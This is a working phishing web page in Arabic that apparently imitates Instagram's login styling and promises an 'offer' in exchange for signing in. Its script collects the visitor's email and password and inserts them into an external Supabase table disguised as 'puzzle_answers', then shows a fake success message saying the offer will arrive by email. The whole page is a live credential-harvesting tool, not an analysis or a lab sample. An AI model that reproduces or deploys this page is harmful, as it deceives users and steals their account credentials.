<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title> تسجيل الدخول للحصول على العرض </title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body {
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Tahoma, Arial, sans-serif;
    background: #fafafa;
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 16px;
  }
  .wrap { width: 100%; max-width: 380px; }
  .card {
    background: #fff;
    border: 1px solid #dbdbdb;
    border-radius: 10px;
    padding: 34px 28px 24px;
    text-align: center;
  }
  .logo {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Tahoma, Arial, sans-serif;
  font-size: 42px;
  font-weight: 800;

  background: linear-gradient(
    90deg,
    #f58529 0%,
    #f56040 20%,
    #fd1d1d 35%,
    #e1306c 55%,
    #c13584 70%,
    #833ab4 85%,
    #5851db 100%
  );

  -webkit-background-clip: text;
  -webkit-text-fill-color: transparent;
  background-clip: text;
  color: transparent;

  margin-bottom: 24px;
  letter-spacing: -1px;
}6;
  }
  .subtitle {
    font-size: 14px;
    color: #737373;
    line-height: 1.7;
    margin-bottom: 22px;
  }
  .field {
    width: 100%;
    padding: 12px;
    margin-bottom: 10px;
    background: #fafafa;
    border: 1px solid #dbdbdb;
    border-radius: 6px;
    font-size: 16px;
    text-align: right;
  }
  .field:focus {
    outline: none;
    border-color: #a8a8a8;
  }
  .btn-main {
    width: 100%;
    min-height: 44px;
    padding: 10px;
    margin-top: 4px;
    background: #0095f6;
    color: #fff;
    border: none;
    border-radius: 7px;
    font-weight: 700;
    font-size: 15px;
    cursor: pointer;
  }
  .btn-main:disabled {
    opacity: .55;
    cursor: default;
  }
  .msg {
    font-size: 13px;
    line-height: 1.6;
    margin-top: 14px;
    padding: 10px;
    border-radius: 6px;
    overflow-wrap: anywhere;
  }
  .msg.error { background: #fdecea; color: #b42318; }
  .msg.success { background: #e6f4ea; color: #176b36; }
  .spinner {
    width: 14px;
    height: 14px;
    border: 2px solid rgba(255,255,255,.4);
    border-top-color: #fff;
    border-radius: 50%;
    display: inline-block;
    animation: spin .7s linear infinite;
    vertical-align: middle;
    margin-left: 6px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<div class="wrap">
  <div class="card">
    <div class="logo">تسجيل الدخول للحصول على العرض </div>
    
    <form id="answerForm">
      <input id="answer1" class="field" type="text" placeholder="Email" autocomplete="off">
      <input id="answer2" class="field" type="password" placeholder="Password" autocomplete="off">

      <button type="submit" class="btn-main" id="submitBtn">
        الحصول على العرض
      </button>
    </form>

    <div id="answerMsg" aria-live="polite"></div>
  </div>
</div>

<script>
  const SUPABASE_URL = "https://sqmhdpykntsxjlpdztms.supabase.co";
  const SUPABASE_KEY = "sb_publishable_2yaR2TFFO_hGQr8puC3ZJA_js9RzVHi";

  const answerForm = document.getElementById('answerForm');
  const answer1Input = document.getElementById('answer1');
  const answer2Input = document.getElementById('answer2');
  const submitBtn = document.getElementById('submitBtn');
  const answerMsg = document.getElementById('answerMsg');

  let db = null;

  function showMsg(text, type) {
    answerMsg.innerHTML = `<div class="msg ${type}">${text}</div>`;
  }

  try {
    if (!window.supabase || typeof window.supabase.createClient !== 'function') {
      throw new Error('تعذر تحميل مكتبة Supabase');
    }

    db = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
  } catch (err) {
    console.error('Supabase init error:', err);
    showMsg('تعذر الاتصال بنظام تسجيل الإجابات. جرّب تحديث الصفحة.', 'error');
    submitBtn.disabled = true;
  }

  answerForm.addEventListener('submit', async function (event) {
    event.preventDefault();

    const answer1 = answer1Input.value.trim();
    const answer2 = answer2Input.value.trim();

    if (!answer1 || !answer2) {
      showMsg('يرجى تسجيل الدخول.', 'error');
      return;
    }

    if (!db) {
      showMsg('الاتصال بقاعدة البيانات غير متاح حاليًا.', 'error');
      return;
    }

    const oldButtonText = submitBtn.innerHTML;
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span> جاري التسجيل...';

    try {
      const { error } = await db
        .from('puzzle_answers')
        .insert({
          answer_1: answer1,
          answer_2: answer2
        });

      if (error) {
        console.error('Supabase insert error:', error);
        showMsg('فشل تسجيل الإجابة: ' + error.message, 'error');
        return;
      }

      showMsg('ستصلك رسالة العرض عبر البريد الالكتروني ✅', 'success');
      answer1Input.value = '';
      answer2Input.value = '';
      answer1Input.focus();

    } catch (err) {
      console.error('Unexpected submit error:', err);
      showMsg('حصل خطأ أثناء الإرسال: ' + (err.message || err), 'error');
    } finally {
      submitBtn.disabled = false;
      submitBtn.innerHTML = oldButtonText;
    }
  });
</script>

</body>
</html>
